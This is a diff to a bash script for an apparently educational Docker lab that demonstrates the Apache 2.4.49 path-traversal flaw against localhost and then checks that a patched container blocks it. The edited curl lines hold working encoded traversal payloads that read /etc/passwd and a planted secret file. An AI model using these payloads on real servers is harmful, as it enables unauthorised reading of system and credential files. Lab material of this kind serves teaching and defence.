@@ -10,6 +10,7 @@
 
 
 TARGET="http://localhost:8080"
+BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
 CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'
 
@@ -30,8 +31,12 @@ banner "STAGE 0 — Preflight Checks"
 command -v docker >/dev/null 2>&1 && pass "docker found" || { fail "docker not found — install Docker Desktop"; exit 1; }
 command -v curl   >/dev/null 2>&1 && pass "curl found"   || { fail "curl not found"; exit 1; }
 
+info "Cleaning up any previous lab containers..."
+(cd "$BASE_DIR/vulnerable" && docker compose down >/dev/null 2>&1) || true
+(cd "$BASE_DIR/patched" && docker compose down >/dev/null 2>&1) || true
+
 info "Starting vulnerable container (this may take a minute on first run)..."
-cd "$(dirname "$0")/vulnerable" || exit 1
+cd "$BASE_DIR/vulnerable" || exit 1
 docker compose up -d --build
 
 echo ""
@@ -51,13 +56,13 @@ pass "Normal requests work fine"
 
 # STAGE 2: path traversal — /etc/passwd
 banner "STAGE 2 — Path Traversal: Read /etc/passwd"
-info "The encoded path: /cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/etc/passwd"
-info "Decoded:          /cgi-bin/././../../../../../../etc/passwd"
+info "The encoded path: /static/.%%2e/.%%2e/.%%2e/.%%2e/etc/passwd"
+info "Decoded:          /static/../../../../etc/passwd"
 info "Why it works:     Apache 2.4.49 decodes %%2e AFTER access checks"
 echo ""
 
 RESULT=$(curl -s --path-as-is \
-  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
+  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/passwd")
 
 if echo "$RESULT" | grep -q "root:"; then
   pass "EXPLOITED — /etc/passwd contents:"
@@ -65,7 +70,7 @@ if echo "$RESULT" | grep -q "root:"; then
   echo "$RESULT" | head -5 | sed 's/^/    /'
   echo "    [... truncated ...]"
 else
-  fail "Exploit did not return expected output. Is the container running?"
+  fail "Exploit did not return expected output."
   echo "$RESULT"
 fi
 
@@ -75,7 +80,7 @@ info "Target: /etc/secret_config.txt (planted during Docker build)"
 echo ""
 
 RESULT=$(curl -s --path-as-is \
-  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/secret_config.txt")
+  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/secret_config.txt")
 
 if echo "$RESULT" | grep -q "SECRET"; then
   pass "EXPLOITED — Secret file contents:"
@@ -110,10 +115,21 @@ fi
 # STAGE 5: mitigation 
 banner "STAGE 5 — Mitigation: Patched Configuration"
 info "Stopping vulnerable container, starting patched container..."
-docker compose down -q
+docker compose down || true
 
 cd ../patched || exit 1
 docker compose up -d --build
+
+if docker ps --format '{{.Names}}' | grep -qx "apache-cve-2021-41773"; then
+  fail "Vulnerable container is still running; cannot validate mitigation"
+  exit 1
+fi
+
+if ! docker ps --format '{{.Names}}' | grep -qx "apache-cve-patched"; then
+  fail "Patched container failed to start"
+  docker compose ps
+  exit 1
+fi
 
 echo ""
 info "Waiting for patched Apache..."
@@ -128,7 +144,7 @@ info "Running the same exploit against patched server..."
 echo ""
 
 HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --path-as-is \
-  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd")
+  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/passwd")
 
 if [ "$HTTP_CODE" = "403" ]; then
   pass "BLOCKED — Server returned HTTP 403 Forbidden"
@@ -141,7 +157,7 @@ fi
 banner "Demo Complete"
 pass "All stages finished."
 info "Stopping containers..."
-docker compose down -q
+docker compose down
 echo ""
 echo -e "  ${BOLD}Summary:${RESET}"
 echo "  Stage 1  Normal request           → 200 OK"
